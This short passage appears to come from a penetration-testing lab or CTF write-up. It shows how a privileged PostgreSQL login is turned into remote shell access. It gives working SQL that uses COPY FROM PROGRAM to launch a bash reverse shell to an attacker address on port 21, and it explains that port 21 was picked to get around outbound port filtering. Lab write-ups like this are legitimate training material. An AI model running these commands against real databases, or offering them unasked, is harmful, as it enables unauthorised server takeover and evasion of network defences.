Since I accessed to postgreSQL with postgres user, we would have high privilege which provides us to execute shell code.

To execute reverse shell command, I input codes below:

DROP TABLE IF EXISTS cmd_exec;

CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.230/21 0>&1"';

SELECT * FROM cmd_exec;

Since the target filters ports like 443, 4444 somehow, I used open port 21 which is used by ftp.

Though port 21 is used by ftp, OS does not limit its usage. Therefore, we can get revshell from port 21 where is allowed to transmit data.
